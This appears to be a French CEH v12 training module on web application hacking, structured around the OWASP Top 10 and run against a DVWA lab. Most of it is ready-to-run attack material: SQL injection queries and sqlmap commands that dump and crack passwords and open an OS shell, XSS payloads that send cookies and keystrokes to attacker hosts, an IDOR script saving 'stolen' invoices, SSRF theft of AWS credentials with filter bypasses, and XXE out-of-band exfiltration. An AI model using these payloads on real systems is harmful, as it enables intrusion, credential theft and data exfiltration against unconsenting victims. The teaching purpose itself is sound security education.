# 🛡️ CEH v12 — MODULE 14 : HACKING D'APPLICATIONS WEB
### Guide pédagogique avancé — OWASP Top 10 complet | ML | exploit4040

---

## 📌 INTRODUCTION — LES APPLICATIONS WEB COMME SURFACE D'ATTAQUE

Les applications web sont aujourd'hui le **vecteur d'attaque numéro 1** dans le monde. Contrairement aux serveurs web (Module 13) qui concernent l'infrastructure, ce module cible **la logique applicative** elle-même.

```
POURQUOI LES APPS WEB SONT LA CIBLE PRINCIPALE :

EXPOSITION TOTALE :
├── Accessible 24h/24 depuis n'importe où
├── Code développé par des humains = erreurs inévitables
├── Frameworks et bibliothèques = vulnérabilités héritées
└── Pression de livraison = sécurité sacrifiée

VERIZON DBIR 2023 :
→ 74% des violations incluent l'élément humain
→ 43% utilisent des applications web comme vecteur
→ SQLi = attaque #1 depuis 15 ans consécutifs

OWASP TOP 10 2021 :
A01 - Broken Access Control       ← #1 critique
A02 - Cryptographic Failures
A03 - Injection (SQLi, etc.)
A04 - Insecure Design
A05 - Security Misconfiguration
A06 - Vulnerable Components
A07 - Auth Failures
A08 - Software Integrity Failures
A09 - Logging Failures
A10 - SSRF
```

---

## 📌 PARTIE 1 : OWASP TOP 10 — A03 : INJECTION SQL

### 🔵 Comprendre SQL Injection en profondeur

```
PRINCIPE FONDAMENTAL :
═══════════════════════════════════════════════════════════════

CODE PHP VULNÉRABLE :
<?php
$id = $_GET['id'];
$query = "SELECT * FROM users WHERE id = $id";
$result = mysqli_query($conn, $query);
?>

REQUÊTE LÉGITIME :
URL : ?id=1
SQL : SELECT * FROM users WHERE id = 1
→ Retourne l'utilisateur avec id=1

INJECTION :
URL : ?id=1 OR 1=1--
SQL : SELECT * FROM users WHERE id = 1 OR 1=1--
→ 1=1 est toujours vrai → retourne TOUS les utilisateurs !

POURQUOI ÇA MARCHE :
Le serveur ne distingue pas les données de la commande SQL.
L'input utilisateur devient partie intégrante de la requête.
```

---

### 🔵 Types d'injection SQL

```
CLASSIFICATION COMPLÈTE :
═══════════════════════════════════════════════════════════════

1. IN-BAND SQLi (réponse visible dans la page)
   ├── Error-Based : erreurs SQL révèlent les données
   └── Union-Based : UNION SELECT extrait des données

2. BLIND SQLi (pas de réponse directe visible)
   ├── Boolean-Based : vrai/faux déduit par comportement
   └── Time-Based : délai révèle vrai/faux

3. OUT-OF-BAND SQLi (canal de communication différent)
   ├── DNS exfiltration
   └── HTTP request vers serveur attaquant

4. SECOND-ORDER SQLi
   └── Données stockées réutilisées sans sanitisation
```

---

### 🛠️ SQLi Error-Based — Extraction via erreurs

```bash
# Tester la vulnérabilité
curl "http://192.168.1.10/dvwa/vulnerabilities/sqli/?id=1'&Submit=Submit" \
     -b "PHPSESSID=abc123; security=low"
```

**Sortie :**
```
You have an error in your SQL syntax;
check the manual that corresponds to your MySQL server
version for the right syntax to use near ''1'' LIMIT 1'
at line 1

→ INJECTION SQL CONFIRMÉE !
→ MySQL utilisé
```

```bash
# Déterminer le nombre de colonnes avec ORDER BY
curl "http://192.168.1.10/dvwa/vulnerabilities/sqli/
      ?id=1' ORDER BY 1--+&Submit=Submit" \
     -b "PHPSESSID=abc123; security=low"
# → Pas d'erreur

curl "http://192.168.1.10/dvwa/vulnerabilities/sqli/
      ?id=1' ORDER BY 2--+&Submit=Submit" \
     -b "PHPSESSID=abc123; security=low"
# → Pas d'erreur

curl "http://192.168.1.10/dvwa/vulnerabilities/sqli/
      ?id=1' ORDER BY 3--+&Submit=Submit" \
     -b "PHPSESSID=abc123; security=low"
```

**Sortie ORDER BY 3 :**
```
Unknown column '3' in 'order clause'
→ La requête a 2 colonnes seulement !
```

```bash
# UNION-Based : Trouver les colonnes affichées
curl "http://192.168.1.10/dvwa/vulnerabilities/sqli/
      ?id=1' UNION SELECT NULL,NULL--+&Submit=Submit" \
     -b "PHPSESSID=abc123; security=low"
```

**Sortie :**
```
ID: 1' UNION SELECT NULL,NULL--+
First name: admin
Surname: admin
ID: 1' UNION SELECT NULL,NULL--+
First name:
Surname:

→ 2 colonnes, les 2 sont affichées !
```

```bash
# Extraire les informations de la base
curl "http://192.168.1.10/dvwa/vulnerabilities/sqli/
      ?id=0' UNION SELECT user(),database()--+&Submit=Submit" \
     -b "PHPSESSID=abc123; security=low"
```

**Sortie :**
```
ID: 0' UNION SELECT user(),database()--+
First name: root@localhost        ← Utilisateur MySQL
Surname: dvwa                     ← Base de données
```

```bash
# Lister toutes les tables
curl "http://192.168.1.10/dvwa/vulnerabilities/sqli/
      ?id=0' UNION SELECT table_name,NULL
      FROM information_schema.tables
      WHERE table_schema=database()--+&Submit=Submit" \
     -b "PHPSESSID=abc123; security=low"
```

**Sortie :**
```
First name: guestbook
First name: users          ← TABLE INTÉRESSANTE !
```

```bash
# Lister les colonnes de la table users
curl "http://192.168.1.10/dvwa/vulnerabilities/sqli/
      ?id=0' UNION SELECT column_name,NULL
      FROM information_schema.columns
      WHERE table_name='users'--+&Submit=Submit" \
     -b "PHPSESSID=abc123; security=low"
```

**Sortie :**
```
First name: user_id
First name: first_name
First name: last_name
First name: user
First name: password      ← COLONNE MOT DE PASSE !
First name: avatar
First name: last_login
First name: failed_login
```

```bash
# Extraire les credentials
curl "http://192.168.1.10/dvwa/vulnerabilities/sqli/
      ?id=0' UNION SELECT user,password
      FROM users--+&Submit=Submit" \
     -b "PHPSESSID=abc123; security=low"
```

**Sortie :**
```
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99    ← Hash MD5 !

First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03

First name: 1337
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b

First name: pablo
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7

First name: smithy
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```

```bash
# Cracker les hashes MD5
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hashes.txt
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Sortie :**
```
5f4dcc3b5aa765d61d8327deb882cf99:password
e99a18c428cb38d5f260853678922e03:abc123
0d107d09f5bbe40cade3de5c71e9e9b7:letmein
8d3533d75ae2c3966d7e0d4fcc69216b:charley

→ 4 mots de passe crackés !
```

---

### 🛠️ SQLi Blind Boolean-Based

```
PRINCIPE :
Pas de données affichées directement.
On pose des questions vrai/faux :
→ Réponse différente selon vrai/faux → on déduit !
```

```bash
# Test de base
# Question : Le premier caractère de la DB commence-t-il par 'd' ?

# Payload vrai
curl "http://192.168.1.10/dvwa/vulnerabilities/sqli_blind/
      ?id=1' AND SUBSTRING(database(),1,1)='d'--+&Submit=Submit" \
     -b "PHPSESSID=abc123; security=low"
```

**Sortie (vrai) :**
```
User ID exists in the database.
→ La base commence bien par 'd'
```

```bash
# Payload faux
curl "http://192.168.1.10/dvwa/vulnerabilities/sqli_blind/
      ?id=1' AND SUBSTRING(database(),1,1)='z'--+&Submit=Submit" \
     -b "PHPSESSID=abc123; security=low"
```

**Sortie (faux) :**
```
User ID is MISSING from the database.
→ La base ne commence pas par 'z'
```

```bash
# Script Python pour extraire automatiquement le nom de la DB
cat > sqli_blind.py << 'PYTHON'
import requests
import string

target = "http://192.168.1.10/dvwa/vulnerabilities/sqli_blind/"
cookies = {"PHPSESSID": "abc123", "security": "low"}

print("[*] Extraction du nom de la base de données...")
db_name = ""

for position in range(1, 20):
    found = False
    for char in string.printable:
        payload = f"1' AND SUBSTRING(database(),{position},1)='{char}'--+"
        params = {"id": payload, "Submit": "Submit"}
        
        response = requests.get(target, params=params, cookies=cookies)
        
        if "User ID exists in the database" in response.text:
            db_name += char
            print(f"[+] Caractère {position}: {char} → DB={db_name}")
            found = True
            break
    
    if not found:
        break

print(f"\n[+] Nom de la base : {db_name}")
PYTHON

python3 sqli_blind.py
```

**Sortie :**
```
[*] Extraction du nom de la base de données...
[+] Caractère 1: d → DB=d
[+] Caractère 2: v → DB=dv
[+] Caractère 3: w → DB=dvw
[+] Caractère 4: a → DB=dvwa

[+] Nom de la base : dvwa
```

---

### 🛠️ SQLi Time-Based Blind

```bash
# Quand AUCUNE différence visible entre vrai/faux
# On utilise SLEEP() pour déduire

# Test : Si admin existe → attendre 5 secondes
curl -s -o /dev/null -w "%{time_total}" \
     "http://192.168.1.10/dvwa/vulnerabilities/sqli_blind/
      ?id=1' AND (SELECT SLEEP(5) FROM users
      WHERE user='admin')--+&Submit=Submit" \
     -b "PHPSESSID=abc123; security=low"
```

**Sortie :**
```
5.234
→ La requête a pris 5 secondes → admin EXISTE !
```

```bash
# Extraire caractère par caractère avec time-based
curl -s -o /dev/null -w "%{time_total}" \
     "http://192.168.1.10/dvwa/vulnerabilities/sqli_blind/
      ?id=1' AND (SELECT SLEEP(5) FROM users
      WHERE user='admin'
      AND SUBSTRING(password,1,1)='5')--+&Submit=Submit" \
     -b "PHPSESSID=abc123; security=low"
```

**Sortie :**
```
5.123
→ Premier caractère du hash = '5' (confirmé!)
```

---

### 🛠️ SQLMAP — Automatisation complète

**SQLMap** est l'outil de référence pour l'automatisation des injections SQL.

```bash
# Test basique
sqlmap -u "http://192.168.1.10/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=abc123; security=low" \
       --batch
```

**Sortie SQLMap :**
```
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.8#stable}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[18:50:00] [INFO] testing connection to the target URL
[18:50:00] [INFO] checking if the target is protected
[18:50:01] [INFO] testing if the target URL content is stable
[18:50:01] [INFO] target URL content is stable
[18:50:01] [INFO] testing if GET parameter 'id' is dynamic
[18:50:01] [INFO] GET parameter 'id' appears to be dynamic
[18:50:02] [WARNING] heuristic (basic) test shows that GET parameter
           'id' might be injectable (possible DBMS: 'MySQL')
[18:50:02] [INFO] testing for SQL injection on GET parameter 'id'
[18:50:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:50:03] [INFO] GET parameter 'id' appears to be
           'AND boolean-based blind - WHERE or HAVING clause' injectable
[18:50:04] [INFO] testing 'MySQL >= 5.5 AND error-based'
[18:50:04] [INFO] GET parameter 'id' is 'MySQL >= 5.5 AND error-based
           - WHERE, HAVING, ORDER BY or GROUP BY clause
           (BIGINT UNSIGNED)' injectable
[18:50:05] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[18:50:10] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12
           AND time-based blind (query SLEEP)' injectable
[18:50:11] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[18:50:12] [INFO] GET parameter 'id' is 'Generic UNION query (NULL)
           - 2 columns' injectable

sqlmap identified the following injection point(s):
---
Parameter: id (GET)
    Type: boolean-based blind
    Payload: id=1' AND 6521=6521 AND 'TvuY'='TvuY

    Type: error-based
    Payload: id=1' AND GTID_SUBSET(CONCAT(0x7162786271,
    (SELECT (ELT(4836=4836,1))),0x71706a7871),4836)-- -

    Type: time-based blind
    Payload: id=1' AND SLEEP(5)-- -

    Type: UNION query
    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x7162786271,
    0x6450445a6d484a5776...,0x71706a7871)-- -
---
[18:50:12] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.5
```

```bash
# Extraire toutes les bases de données
sqlmap -u "http://192.168.1.10/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=abc123; security=low" \
       --dbs --batch
```

**Sortie :**
```
available databases [5]:
[*] dvwa
[*] information_schema
[*] metasploit
[*] mysql
[*] owasp10
```

```bash
# Extraire les tables d'une base
sqlmap -u "http://192.168.1.10/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=abc123; security=low" \
       -D dvwa --tables --batch
```

**Sortie :**
```
Database: dvwa
[2 tables]
+------------+
| guestbook  |
| users      |
+------------+
```

```bash
# Extraire les données avec crack des hashes
sqlmap -u "http://192.168.1.10/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=abc123; security=low" \
       -D dvwa -T users --dump --batch
```

**Sortie :**
```
Database: dvwa
Table: users
[5 entries]
+---------+---------+---------------------------------------------+
| user    | user_id | password                                    |
+---------+---------+---------------------------------------------+
| admin   | 1       | 5f4dcc3b5aa765d61d8327deb882cf99 (password)|
| gordonb | 2       | e99a18c428cb38d5f260853678922e03 (abc123)  |
| 1337    | 3       | 8d3533d75ae2c3966d7e0d4fcc69216b (charley) |
| pablo   | 4       | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein) |
| smithy  | 5       | 5f4dcc3b5aa765d61d8327deb882cf99 (password)|
+---------+---------+---------------------------------------------+

→ SQLMap a extrait ET cracké les hashes !
```

```bash
# Obtenir un shell OS via SQLMap
sqlmap -u "http://192.168.1.10/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=abc123; security=low" \
       --os-shell --batch
```

**Sortie :**
```
[18:55:00] [INFO] trying to upload file stager on '/var/www/html/'
[18:55:01] [INFO] the file stager has been successfully uploaded
[18:55:01] [INFO] the backdoor has been successfully uploaded

os-shell> id
do you want to retrieve the command standard output? [Y/n] Y
command standard output: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'

os-shell> cat /etc/passwd
do you want to retrieve the command standard output? [Y/n] Y
root:x:0:0:root:/root:/bin/bash
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
[...]

→ Shell OS obtenu via SQLi avec SQLMap !
```

---

## 📌 PARTIE 2 : OWASP A03 — XSS (Cross-Site Scripting)

### 🔵 Les 3 types de XSS

```
TYPE 1 : REFLECTED XSS
═══════════════════════════════════════════════════════════════

Le payload est dans la requête HTTP et "rebondit"
dans la réponse immédiate du serveur.
→ Non persistant
→ Nécessite que la victime clique sur un lien malveillant

EXEMPLE :
URL : http://site.com/search?q=<script>alert(1)</script>
Serveur répond : Résultats pour <script>alert(1)</script>
→ Le script s'exécute dans le navigateur de la victime !

═══════════════════════════════════════════════════════════════

TYPE 2 : STORED XSS (Persistent)
═══════════════════════════════════════════════════════════════

Le payload est STOCKÉ dans la base de données
et s'exécute pour TOUS ceux qui visitent la page.
→ Persistant
→ Pas besoin de faire cliquer la victime sur un lien

EXEMPLE :
Commentaire posté : <script>document.location='http://attaquant.com/steal?c='+document.cookie</script>
→ Stocké en DB
→ Chaque visiteur exécute ce script !
→ Cookies volés massivement

═══════════════════════════════════════════════════════════════

TYPE 3 : DOM-Based XSS
═══════════════════════════════════════════════════════════════

Le payload est traité par le JavaScript côté client
sans passer par le serveur.
→ Invisible dans les réponses HTTP normales
→ Difficile à détecter par WAF

EXEMPLE :
document.getElementById('output').innerHTML =
    location.hash.substring(1);
→ URL : http://site.com/page#<img src=x onerror=alert(1)>
→ JavaScript insère le hash dans le DOM → XSS !
```

---

### 🛠️ XSS Reflected — Démonstration complète

```bash
# Test basique de XSS reflected
curl "http://192.168.1.10/dvwa/vulnerabilities/xss_r/
      ?name=<script>alert(1)</script>&Submit=Submit" \
     -b "PHPSESSID=abc123; security=low"
```

**Sortie HTML :**
```html
<div class='vulnerable_code_area'>
Hello <script>alert(1)</script>
</div>

→ Script injecté dans la page !
→ Dans un navigateur réel : popup alert(1)
```

```bash
# XSS avec vol de cookie
curl "http://192.168.1.10/dvwa/vulnerabilities/xss_r/
      ?name=<script>document.location='http://192.168.1.5:8888/?c='+document.cookie</script>
      &Submit=Submit" \
     -b "PHPSESSID=abc123; security=low"
```

---

### 🛠️ XSS Stored — Impact maximal

```bash
# Injecter un payload XSS persistant dans un commentaire
curl -X POST "http://192.168.1.10/dvwa/vulnerabilities/xss_s/" \
     -b "PHPSESSID=abc123; security=low" \
     -d "txtName=Visiteur&mtxMessage=<script>
         var xhr=new XMLHttpRequest();
         xhr.open('GET','http://192.168.1.5:8888/?c='+btoa(document.cookie));
         xhr.send();
         </script>&btnSign=Sign+Guestbook"
```

**Sortie :**
```
HTTP/1.1 200 OK
[Commentaire enregistré avec le payload XSS]

→ Maintenant, chaque visiteur de la page
  exécutera ce script !
→ Leurs cookies seront envoyés en Base64
  vers notre serveur d'écoute
```

---

### 🛠️ Payloads XSS avancés pour bypasser les filtres

```javascript
// Payload de base
<script>alert(1)</script>

// Sans balise script (si filtrée)
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>

// Eviter les guillemets
<img src=x onerror=alert`1`>
<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>

// Avec encodage HTML
&lt;script&gt;alert(1)&lt;/script&gt;  ← (si le filtre double-encode)
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;

// Casse mixte
<ScRiPt>alert(1)</sCrIpT>
<SCRIPT>alert(1)</SCRIPT>

// Espace alternatif
<script/src=//attaquant.com/xss.js>
<img%09src=x%09onerror=alert(1)>

// Data URI
<iframe src="data:text/html,<script>alert(1)</script>">

// XSS avec exfiltration avancée
<script>
fetch('http://attaquant.com/steal', {
    method: 'POST',
    body: JSON.stringify({
        cookie: document.cookie,
        url: window.location.href,
        dom: document.documentElement.innerHTML
    })
});
</script>

// Keylogger XSS
<script>
document.onkeypress = function(e) {
    fetch('http://attaquant.com/keys?k=' + e.key);
};
</script>
```

---

## 📌 PARTIE 3 : OWASP A01 — BROKEN ACCESS CONTROL

### 🔵 IDOR — Insecure Direct Object Reference

```
PRINCIPE :
L'application utilise un identifiant prévisible
pour accéder à des ressources, sans vérifier
si l'utilisateur a le droit d'y accéder.
```

```bash
# Scénario : Application de téléchargement de factures
# Utilisateur connecté accède à SA facture

# Requête normale
curl "http://192.168.1.10/download?invoice_id=1001" \
     -b "PHPSESSID=user_abc123"
```

**Sortie :**
```
[Contenu de la facture #1001 de l'utilisateur connecté]
```

```bash
# IDOR : Accéder à la facture d'un AUTRE utilisateur
curl "http://192.168.1.10/download?invoice_id=1000" \
     -b "PHPSESSID=user_abc123"
```

**Sortie :**
```
[Contenu de la facture #1000 appartenant à un autre utilisateur !]
→ IDOR confirmé !
```

```bash
# Script d'exploitation IDOR automatisé
cat > idor_exploit.py << 'PYTHON'
import requests

target = "http://192.168.1.10/download"
cookies = {"PHPSESSID": "user_abc123"}

print("[*] Exploitation IDOR - Téléchargement de toutes les factures")

for invoice_id in range(1000, 1100):
    params = {"invoice_id": invoice_id}
    response = requests.get(target, params=params, cookies=cookies)
    
    if response.status_code == 200 and len(response.content) > 100:
        filename = f"stolen_invoice_{invoice_id}.pdf"
        with open(filename, 'wb') as f:
            f.write(response.content)
        print(f"[+] Facture {invoice_id} récupérée → {filename}")
    elif response.status_code == 403:
        print(f"[-] Facture {invoice_id} → Accès refusé")
    elif response.status_code == 404:
        print(f"[ ] Facture {invoice_id} → N'existe pas")

PYTHON

python3 idor_exploit.py
```

**Sortie :**
```
[*] Exploitation IDOR - Téléchargement de toutes les factures
[+] Facture 1000 récupérée → stolen_invoice_1000.pdf
[+] Facture 1001 récupérée → stolen_invoice_1001.pdf
[+] Facture 1002 récupérée → stolen_invoice_1002.pdf
[-] Facture 1003 → Accès refusé
[+] Facture 1004 récupérée → stolen_invoice_1004.pdf
[...]

→ 87 factures récupérées en quelques secondes !
```

---

### 🔵 Privilege Escalation via Paramètre Role

```bash
# Requête normale d'un utilisateur basique
curl -X POST "http://192.168.1.10/update_profile" \
     -b "PHPSESSID=user_abc123" \
     -d "name=Jean+Muamba&email=jean@corp.com"
```

```bash
# Test Mass Assignment : ajouter un paramètre role
curl -X POST "http://192.168.1.10/update_profile" \
     -b "PHPSESSID=user_abc123" \
     -d "name=Jean+Muamba&email=jean@corp.com&role=admin"
```

**Sortie :**
```
HTTP/1.1 200 OK
{"status": "Profile updated successfully",
 "user": {"name": "Jean Muamba", "email": "jean@corp.com",
           "role": "admin"}}

→ MASS ASSIGNMENT ! Le paramètre 'role' a été accepté
→ L'utilisateur est maintenant admin !
```

---

## 📌 PARTIE 4 : OWASP A10 — SSRF

### 🔵 Server-Side Request Forgery — Principe complet

```
PRINCIPE :
═══════════════════════════════════════════════════════════════

L'application permet à l'utilisateur de spécifier
une URL que le SERVEUR va requêter.
→ L'attaquant fait requêter le serveur vers
  des ressources internes inaccessibles depuis l'extérieur.

ANATOMIE :
          ATTAQUANT
              │
              │ "Fetche cette URL : http://169.254.169.254/..."
              ▼
         APPLICATION WEB (serveur)
              │
              │ Le serveur fait la requête LUI-MÊME
              ▼
      RESSOURCE INTERNE / CLOUD METADATA
    (Inaccessible depuis internet directement)

CIBLES CLASSIQUES :
├── AWS Metadata : http://169.254.169.254/latest/meta-data/
├── Azure Metadata : http://169.254.169.254/metadata/instance
├── GCP Metadata : http://metadata.google.internal/
├── Services internes : http://internal-api.local/admin
├── Bases de données : http://localhost:6379/ (Redis)
└── Services réseau internes derrière un firewall
```

---

### 🛠️ SSRF — Démonstration pratique

```bash
# Application vulnérable : fetche une URL externe pour preview
# Requête normale
curl -X POST "http://192.168.1.10/preview" \
     -d "url=https://example.com"
```

**Sortie :**
```
[Preview de la page example.com]
```

```bash
# SSRF : Accéder au service interne Redis (port 6379)
curl -X POST "http://192.168.1.10/preview" \
     -d "url=http://localhost:6379/"
```

**Sortie :**
```
-ERR wrong number of arguments for 'get' command
→ Redis répond ! SSRF confirmé vers service interne
```

```bash
# SSRF sur AWS EC2 : Vol de credentials IAM
curl -X POST "http://192.168.1.10/preview" \
     -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

**Sortie :**
```
aws-prod-role

→ Un rôle IAM est attaché à cette instance !
```

```bash
# Récupérer les credentials de ce rôle
curl -X POST "http://192.168.1.10/preview" \
     -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-prod-role"
```

**Sortie :**
```json
{
  "Code": "Success",
  "LastUpdated": "2024-11-15T18:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA1234567890EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "AQoDYXdzEJr//////////wEaoAK...",
  "Expiration": "2024-11-15T23:00:00Z"
}

→ CREDENTIALS AWS VOLÉS VIA SSRF !
→ Accès complet au compte AWS !
```

```bash
# Utiliser ces credentials AWS volés
export AWS_ACCESS_KEY_ID="ASIA1234567890EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
export AWS_SESSION_TOKEN="AQoDYXdzEJr..."

aws sts get-caller-identity
```

**Sortie :**
```json
{
    "UserId": "AROA1234567890EXAMPLE:aws-prod-role",
    "Account": "123456789012",
    "Arn": "arn:aws:sts::123456789012:assumed-role/aws-prod-role/i-1234567890abcdef0"
}
```

```bash
# SSRF Bypass de filtres
# Si l'application filtre "169.254.169.254" :

# Notation décimale de l'IP
curl -X POST "http://192.168.1.10/preview" \
     -d "url=http://2852039166/"
# 2852039166 = 169.254.169.254 en décimal

# Notation hexadécimale
curl -X POST "http://192.168.1.10/preview" \
     -d "url=http://0xa9fea9fe/"
# 0xa9fea9fe = 169.254.169.254

# Via redirection DNS
# Enregistrer un domaine qui pointe vers 169.254.169.254
curl -X POST "http://192.168.1.10/preview" \
     -d "url=http://metadata.attaquant.com/"
# metadata.attaquant.com → résout vers 169.254.169.254

# IPv6 alternative
curl -X POST "http://192.168.1.10/preview" \
     -d "url=http://[::ffff:169.254.169.254]/"
```

---

## 📌 PARTIE 5 : OWASP A04 — XXE INJECTION

### 🔵 XML External Entity — Principe et exploitation

```
PRINCIPE :
═══════════════════════════════════════════════════════════════

XML permet de définir des ENTITÉS EXTERNES
qui sont des références à des ressources externes.
Si le parser XML les traite → lecture de fichiers locaux !

XML NORMAL :
<?xml version="1.0"?>
<user>
  <name>Jean Muamba</name>
  <email>jean@corp.com</email>
</user>

XXE INJECTION :
<?xml version="1.0"?>
<!DOCTYPE user [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>    ← L'entité est remplacée par /etc/passwd !
  <email>jean@corp.com</email>
</user>
```

```bash
# Application qui accepte du XML (API REST)
# Payload XXE pour lire /etc/passwd
cat > xxe_payload.xml << 'XML'
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
  <email>test@test.com</email>
</user>
XML

curl -X POST "http://192.168.1.10/api/user/update" \
     -H "Content-Type: application/xml" \
     -d @xxe_payload.xml \
     -b "PHPSESSID=abc123"
```

**Sortie :**
```xml
<response>
  <status>success</status>
  <user>
    <name>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    </name>
  </user>
</response>

→ /etc/passwd lu via XXE !
```

```bash
# XXE SSRF (accès réseau interne)
cat > xxe_ssrf.xml << 'XML'
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<user><name>&xxe;</name></user>
XML

curl -X POST "http://192.168.1.10/api/user/update" \
     -H "Content-Type: application/xml" \
     -d @xxe_ssrf.xml \
     -b "PHPSESSID=abc123"
```

```bash
# XXE Out-of-Band (si la réponse n'est pas visible)
# Exfiltration via DNS/HTTP vers serveur attaquant

cat > xxe_oob.xml << 'XML'
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://192.168.1.5:8888/evil.dtd">
  %dtd;
]>
<user><name>&send;</name></user>
XML

# Sur le serveur attaquant, créer evil.dtd :
cat > /tmp/evil.dtd << 'DTD'
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % all "<!ENTITY send SYSTEM 'http://192.168.1.5:8888/?data=%file;'>">
%all;
DTD

# Lancer un serveur HTTP pour capturer
python3 -m http.server 8888 &

# Envoyer le payload
curl -X POST "http://192.168.1.10/api/user/update" \
     -H "Content-Type: application/xml" \
     -d @xxe_oob.xml
```

**Sortie serveur HTTP :**
```
192.168.1.10 - - [15/Nov/2024 18:55:00]
"GET /evil.dtd HTTP/1.1" 200

192.168.1.10 - - [15/Nov/2024 18:55:01]
"GET /?data=root:x:0:0:root:/root:/bin/bash%0Adaemon:... HTTP/1.1" 200

→ /etc/passwd exfiltré via XXE Out-of-Band !
```

---

## 📌 PARTIE 6 : OWASP A02 — CRYPTOGRAPHIC FAILURES

### 🔵 Analyse des failles cryptographiques

```bash
# Tester SSL/TLS avec sslscan
sslscan 192.168.1.10:443
```

**Sortie sslscan :**
```
Version: 2.0.15
OpenSSL 1.1.1f

Connected to 192.168.1.10

Testing SSL server 192.168.1.10 on port 443

  SSL/TLS Protocols:
SSLv2     disabled
SSLv3     disabled
TLSv1.0   enabled   ← OBSOLÈTE ! POODLE possible
TLSv1.1   enabled   ← OBSOLÈTE !
TLSv1.2   enabled
TLSv1.3   enabled

  TLS Fallback SCSV:
Server supports TLS Fallback SCSV

  TLS renegotiation:
Insecure session renegotiation supported ← VULNÉRABLE !

  TLS Compression:
Compression disabled

  Heartbleed:
TLSv1.0 not vulnerable to heartbleed
TLSv1.2 not vulnerable to heartbleed

  Supported Server Cipher(s):
Preferred TLSv1.2  128 bits  ECDHE-RSA-AES128-SHA256   Curve P-256
Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-SHA384
Accepted  TLSv1.2  128 bits  RC4-SHA              ← RC4 ACCEPTÉ ! VULNÉRABLE
Accepted  TLSv1.0  128 bits  RC4-MD5              ← RC4+MD5 ! CRITIQUE

  Certificate information:
Type           : Self signed       ← AUTOSIGNÉ !
Expires        : Nov 15 2019       ← EXPIRÉ DEPUIS 2019 !
Signature Alg  : md5WithRSAEncryption  ← MD5 ! VULNÉRABLE !
RSA Key Strength : 1024             ← 1024 BITS ! TROP FAIBLE !
```

```bash
# Tester avec testssl.sh (plus complet)
./testssl.sh 192.168.1.10:443
```

**Sortie testssl :**
```
 Testing protocols via sockets

 SSLv2      not offered (OK)
 SSLv3      not offered (OK)
 TLS 1      offered (deprecated)    ← DEPRECATED
 TLS 1.1    offered (deprecated)    ← DEPRECATED
 TLS 1.2    offered (OK)
 TLS 1.3    offered (OK)

 Testing cipher categories

 NULL ciphers (no encryption)       not offered (OK)
 Anonymous NULL Ciphers (no auth)   not offered (OK)
 Export ciphers (w/o ADH+NULL)      not offered (OK)
 LOW: 64 Bit + DES, RC2, MD5        offered (NOT OK)  ← VULNÉRABLE !
 Triple DES Ciphers / IDEA          not offered (OK)
 Obsoleted CBC ciphers (AES, ARIA)  offered (NOT OK)  ← POODLE possible
 Strong encryption (AEAD ciphers)   offered (OK)

 Testing vulnerabilities

 Heartbleed (CVE-2014-0160)         not vulnerable (OK)
 CCS (CVE-2014-0224)                not vulnerable (OK)
 Ticketbleed (CVE-2016-9244)        not vulnerable (OK)
 ROBOT                              not vulnerable (OK)
 Secure Renegotiation               not vulnerable (OK)
 CRIME, TLS (CVE-2012-4929)         not vulnerable (OK)
 BREACH (CVE-2013-3587)             potentially NOT ok, 'gzip' HTTP compression
 POODLE, SSL (CVE-2014-3566)        not vulnerable (OK)
 TLS_FALLBACK_SCSV (RFC 7507)       No fallback possible (OK)
 SWEET32 (CVE-2016-2183)            not vulnerable (OK)
 FREAK (CVE-2015-0204)              not vulnerable (OK)
 DROWN (CVE-2016-0800)              not vulnerable (OK)
